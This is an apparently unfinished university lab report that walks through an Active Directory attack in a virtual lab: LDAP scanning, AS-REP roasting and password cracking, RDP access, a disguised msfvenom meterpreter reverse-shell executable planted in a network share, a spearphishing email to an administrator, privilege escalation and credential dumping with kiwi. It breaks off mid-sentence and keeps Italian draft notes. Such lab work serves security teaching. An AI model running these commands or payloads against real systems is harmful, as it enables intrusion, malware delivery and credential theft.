---


---

<h1 id="cybersecurity-hacking-lab-report">Cybersecurity Hacking Lab: Report</h1>
<p>This document will present a complete and step-by-step guide to perform a hacking laboratory activity in a virtualized environment, reproducing a fake but realistic scenario.</p>
<h2 id="introduction-to-the-activity">Introduction to the activity</h2>
<h3 id="scenario">Scenario</h3>
<p>This laboratory tries to give an overview of the steps that might be performed by an attacker in a common organization running <strong>Windows Active Directory</strong> in order to take control of an high-privilege account.</p>
<p>The main characteristics of the hypotetical scenario are the following:</p>
<ul>
<li>All the computers and devices of the organization are part of a <strong>domain</strong>, based on <strong>Windows Active Directory</strong>;</li>
<li>The domain mainly relies on two (physically and logically) different servers:
<ul>
<li>A server that acts as <strong>Domain Controller</strong> and <strong>DHCP server</strong>;</li>
<li>Another server that acts as <strong>DNS server</strong> and <strong>File Server</strong>;</li>
</ul>
</li>
<li>Domain accounts are divided in two major “groups”:
<ul>
<li><strong>Domain Administrators</strong>, which have “high privileges” on <em>all</em> machines;</li>
<li><strong>Domain users</strong>, which have “low privileges” on <em>all</em> machines;</li>
</ul>
</li>
<li>Also, the following restrictions are enforced:
<ul>
<li>Domain Administrators are set up to be also <strong>Local Administrators</strong> on <em>all</em> the machines;</li>
<li>The DNS server can be accessed only by a specific user (with administrative privileges), who can access only that specific machine.</li>
<li>That last user is configured to perform login <strong>without pre-authentication</strong>;</li>
</ul>
</li>
<li><strong>Remote Desktop</strong> access is allowed on the DNS server;</li>
<li>All accounts can <strong>read</strong> a <strong>shared network folder</strong>, which can be written only by administrators;</li>
</ul>
<p>Where not differently specified, all other settings are intented to be the “default” ones.</p>
<p>It is assumed that the organization follows a <strong>bad passwords management</strong>, using common and easily predictable passwords, also for administrators accounts.</p>
<h3 id="goal">Goal</h3>
<p>The main goal of this laboratory is to <strong>gain access to the credentials of a domain administrator account</strong>.</p>
<h3 id="threat-model">Threat Model</h3>
<p>It is assumed that the attacker:</p>
<ul>
<li>is “located” inside the network and owns the credentials of a domain user account (with low privileges);</li>
<li>can contact servers, also from a personal device which is not part of the domain;</li>
</ul>
<h2 id="setting-up-the-virtual-environment">Setting up the Virtual Environment</h2>
<h3 id="installing-the-virtual-machines">Installing the Virtual Machines</h3>
<p>This activity requires the set-up of a virtual environment, in which the following machines need to be installed:</p>
<ul>
<li><strong>2</strong> VMs running <strong>Windows Server 2012</strong>;</li>
<li><strong>1</strong> VM running <strong>Windows 7</strong>;</li>
<li><strong>1</strong> VM running <strong>Kali Linux</strong>;</li>
</ul>
<p>All machines can be installed as virtual machines; for doing so, any virtualization software is good.<br>
OS versions are not mandatory, but all necessary features must available.</p>
<p>It is clearly required that all these machines can communicate between each-other, so the virtualizator must be set up for allowing this.</p>
<h3 id="configuring-the-machines">Configuring the Machines</h3>
<p><mark>RIMANDO A CONFIGURAZIONI COME DA SCENARIO --&gt; CITARE PRINCIPALI MODI PER REALIZZARE LO SCENARIO: utenti e come realizzare le ipotesi di lavoro (a grandi linee)</mark></p>
<p><mark>impacket deve essere installato su Kali (in generale, tutti i pacchetti/comandi usati)</mark></p>
<p><mark>IP Kali 10.0.2.15</mark></p>
<h2 id="lets-start-hacking">Let’s start Hacking!</h2>
<p>Once set-up the environment as reported, it is finally possible to begin the laboratory!</p>
<p>Please notice that, unless it is specifically reported, all the actions are intended to be performed from the <strong>Kali Linux</strong> machine, located in the same network of the other devices but NOT part of the Active Directory Domain Services.</p>
<p><mark>ACCOUNT CONTROLLATO DALL’UTENTE</mark></p>
<ol start="0">
<li>
<p><strong>Open a Shell:</strong><br>
In order to perform all the following actions, a shell needs to be available on the Kali Linux machine.</p>
</li>
<li>
<p><strong>Finding the IP address of the Domain Controller</strong>:<br>
To begin, we need to find the IP address of the Domain Controller.<br>
For doing so, we execute the following command:</p>
<p><code>nmap -p 389 -A -v -Pn 10.0.2.0/24</code></p>
<p>which tries to contact all the IP addresses in the range <code>10.0.2.0 - 10.0.2.255</code> on port  <strong>389</strong> (LDAP) to check whether it is open and the device is ready to accept requests.</p>
<p>From the response, we find out that the DomainController has IPv4 address <strong><code>10.0.2.200</code></strong>.</p>
<p><img src="https://raw.githubusercontent.com/AM311/Cybersecurity_Report/main/img/nmap_DC.png" alt="Response of the nmap request"></p>
</li>
<li>
<p><strong>Ask the DC the list of accounts which do not require Kerberos pre-authentication</strong>:<br>
As first attempt, we ask the DomainController the list of all accounts that can authenticate via Kerberos without pre-authentication: hopefully, we will find a Domain Administrator account using which we will be able to login to the DC.</p>
<p>For doing this, we run a specific LDAP query to the DC, generated by our legitimate account, using the following command:</p>
<p><code>impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00!</code></p>
<p>As it is shown below, there are two domain accounts that soddisfy the requests.<br>
We will focus our next efforts on <code>DNSoperator</code> since, as the name states, it will probably be authorized to operate on the <strong>DNS/File Server</strong>.</p>
<p><img src="https://github.com/AM311/Cybersecurity_Report/blob/main/img/noPreAuth.png?raw=true" alt="Accounts that does not require pre-auth"></p>
<p><mark>DIMOSTRARE CHE QUELL’ACCOUNT PUÒ CONNETTERSI SOLO AL DNS (altrimenti basterebbe così!)</mark></p>
</li>
<li>
<p><strong>Ask for a TGT for these accounts:</strong><br>
Using the following command we ask the DC for a TGT foreach of the previous accounts and we format them so that they are ready to be cracked using <em>John the Ripper</em>:</p>
<p><code>impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request -format john</code></p>
<p>From the output, we copy the string referring to the desired account (<em>as shown below</em>) in a <strong>text file</strong> called <code>usernames.txt</code> and located on the desktop.</p>
<p><code>$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc 35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96 efad6f7ed8343a734e0f401c91ec09a83d11542d377f0d1daf690d7205a3b5d8316a2d1afdd0a6ac4b3e9 2fb4d6d295a60b074e549aa6a7c0e24cccfd7dd96cfdb06f908d38de6cb775f4fa44b5eae69bc2452fdfb bfa6ca73a70233a2f64e778d3bd286047a69ddf6fd99379b264f747034c32c66971240bede9becb6150fc 85d516545f661aef05c22fc5c26a210a4243627cf681ea61f45996fb8d235b3f9d972433c390ff3b4250f 576c96c54d167a61a76717831eb320b84aa37acef60cd3f1c781bf6e</code></p>
</li>
<li>
<p><strong>Perform AS-Rep Roasting:</strong><br>
As said, we will now try to crack the password used for encoding the response obtained together with the TGT, performing a so-called AS-Rep Roasting attack.<br>
For doing so, we will use <strong>John the Ripper</strong>, basing the offline-guessing activity on a password dictionary called <code>rockyou</code>.</p>
<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ./Desktop/usernames.txt</code></p>
<p>“Fortunately”, the password is present in the dictionary, so <em>john</em> finds it immediately: it is <strong><code>Qwerty123</code></strong>.</p>
<p><img src="https://github.com/AM311/Cybersecurity_Report/blob/main/img/asRepRoasting.png?raw=true" alt="Result of the offline guessing with John the Ripper"></p>
<p>Thanks to this, we now know the credentials of an Admin account authorized to connect to the DNS/File server; so, we now try to do so.</p>
<p><mark>VERIFICARE CHE SI POSSA FARE DESKTOP REMOTO</mark></p>
</li>
<li>
<p><strong>Open a remote connection to the DNS/File Server:</strong><br>
Now that we know the credentials for an account that can logon to the DNS/File Server, we can open a connection to that machine and perform some “useful” actions!<br>
To open a remote desktop connection, we can use the following command directly from the Kali Linux machine:</p>
<p><code>rdesktop 10.0.2.250 -u DNSoperator -p Qwerty123 -d cybersec.units.it -r disk:share=~/Desktop/share</code></p>
<p>Using the option <code>-r disk:share=~/Desktop/share</code> we can share the folder <code>share</code> between the Kali Linux machine and the remote DNS/File Server, so we are able to easily move documents between the two devices.</p>
</li>
<li>
<p><strong>Generation of a payload for starting a reverse shell and injection:</strong><br>
In a different shell window, we now proceed with the generation of an exploit through which we will try to inject a reverse shell client to the computers of the organization.<br>
We will use <strong><code>meterpreter</code></strong> as reverse shell; for doing so, we run the following command on the Kali Linux machine to generate a payload that launches the reverse shell client:</p>
<p><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe</code></p>
<p><code>msfvenom</code> is a pre-installed payload generator and encoder available on Kali, through which we build a <code>.exe</code> file executable on all Windows devices. This payload will spawn a reverse shell client, which will connect to the reverse shell server listening on the Kali machine (<code>10.0.2.15</code>) on the default TCP port (<code>4444</code>).</p>
<p>The output of the command execution is a <code>.exe</code> file that we will find on the Kali’s desktop.<br>
The name of the executable (<code>WorkShiftsManager.exe</code>) is deliberately misleading since we want not to raise any suspicion.</p>
<p>We now need to <strong>inject</strong> the exploit into the systems. For doing so, we can easily rely on the remote desktop connection that we have already opened: we copy the executable file into the folder shared between Kali and the server; then, from the remote desktop window that controls the server, we copy the file into the network shared folder.<br>
Doing so, all the account of the organization will be able to see (and execute) that file.</p>
</li>
<li>
<p><strong>Run the reverse shell server:</strong><br>
For allowing us to take control of a machine, we obviously need to start the reverse shell server on our Kali Linux machine.<br>
For doing so, we launch the following command:</p>
<p><code>msfconsole -r ./Desktop/meterpreter.rc</code></p>
<p>where <code>msfconsole</code> is a CLI through which it is possible to interact with the Metasploit Framework and <code>meterpreter.rx</code> is a script, previously created, made up of the following commands:</p>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.2.15
set ExitOnSession false
exploit -j -z
</code></pre>
<p>The script, basically, starts a generic payload handler and makes it listening on the default port of the current machine for incoming connections from a <code>windows/meterpreter/reverse_tcp</code> payload, which is the one that we have injected.</p>
</li>
<li>
<p><strong>"Convince" a Domain Administrator to run the executable:</strong><br>
In order to make this whole system effectively work, we need to “convince” a domain administrator to run the executable: doing so, we will be able to communicate to a process (the reverse shell client) running with high-privileges (remember: all domain administrators are also local administrators), so we will be able to <strong>steal the credentials</strong> of the logged account.</p>
<p>To identify the target account, we run a LDAP query for listing all the domain accounts:</p>
<p><code>impacket-GetADUsers -dc-ip 10.0.2.200 -all -ts cybersec.units.it/DomainUser:User00!</code></p>
<p>Which gives the following output:</p>
<p><img src="https://github.com/AM311/Cybersecurity_Report/blob/main/img/allUsers.png?raw=true" alt="All domain accounts"></p>
<p>It seems quite obvious that <strong><code>DomainAdmin</code></strong> will be a good target, so we use the given email to send a spearphishing message:<br>
<img src="https://github.com/AM311/Cybersecurity_Report/blob/main/img/email.png?raw=true" alt="Phishing email sent to the domain administrator"></p>
<p>Hopefully, the user will anywhen run the process as instructed.</p>
<blockquote>
<p>The technical details for sending a phishing message with a credible/lookalike/spoofed sending address are out of this guide.</p>
</blockquote>
<p><mark>NOTE SU MOTIVO DI RUN AS ADMIN – COLLEGAMENTO A NOTA ESPLICATIVA</mark></p>
</li>
<li>
<p><strong>Communication between devices and Privilege Escalation:</strong><br>
Once the user has followed the instructions and run the exploit, on the Kali machine we should see that a new session (with a given numeric ID) has been opened. Typing <code>sessions -i &lt;ID&gt;</code> we launch the <code>meterpreter</code> CLI with that endpoint and are ready to communicate.</p>
<p>Now that we are able to send requests to the infected machine, we firstly check the identity of the process that runs <code>meterpreter</code> on that device invoking the <code>getuid</code> command: as shown in the image below, the process is owned by the domain account <code>DomainAdmin</code>.</p>
<p>In order to complete our future tasks, we need to run the process as <code>SYSTEM</code>. For doing so, we run the <code>getsystem</code> command<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup>. If the execution is successfully completed, running again <code>getuid</code> we will now be running as <code>SYSTEM</code>.</p>
<p><img src="https://github.com/AM311/Cybersecurity_Report/blob/main/img/msfconsole_getuid-system.png?raw=true" alt="Privilege escalation on msfconsole"></p>
</li>
<li>
<p><strong>Steal the credentials of the logged account:</strong><br>
Now that we are running as SYSTEM, we can finally dump the credentials of all the accounts that are stored on the infected machine, both local ones (on the SAM database) and logged one (in LSASS memory).</p>
<p>For doing so, we firstly need to run the <strong>kiwi</strong> extension, using the command <code>load kiwi</code>, then invoking <code>creds_all</code> we are finally able to<br>
f</p>
<p><img src="https://github.com/AM311/Cybersecurity_Report/blob/main/img/credentials.png?raw=true" alt="All credentials stolen from the memory"></p>
</li>
</ol>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><code>getsystem</code> requires the process to be run as administrator (to be “previously” authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details <a href="https://docs.rapid7.com/metasploit/meterpreter-getsystem/">here</a>. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>

